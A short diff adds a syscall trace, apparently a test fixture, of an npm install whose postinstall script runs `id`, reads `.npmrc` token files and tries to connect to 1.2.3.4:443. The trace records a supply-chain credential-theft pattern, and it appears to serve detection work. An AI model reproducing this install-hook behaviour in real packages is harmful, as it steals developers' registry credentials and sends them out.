@@ -1,0 +1,7 @@
+1234  execve("/usr/local/bin/npm", ["npm", "install", "--ignore-scripts=false"], 0x0) = 0
+1234  openat(AT_FDCWD, "/pkg/package.json", O_RDONLY) = 3
+1235  execve("/usr/local/bin/node", ["node", "/pkg/postinstall.js"], 0x0) = 0
+1235  execve("/usr/bin/id", ["id"], 0x0) = 0
+1235  openat(AT_FDCWD, "/root/.npmrc", O_RDONLY) = -1 ENOENT (No such file or directory)
+1235  openat(AT_FDCWD, "/home/user/.npmrc", O_RDONLY) = 4
+connect(5, {sa_family=AF_INET, sin_addr="1.2.3.4", sin_port=htons(443)}, 16) = -1 ECONNREFUSED
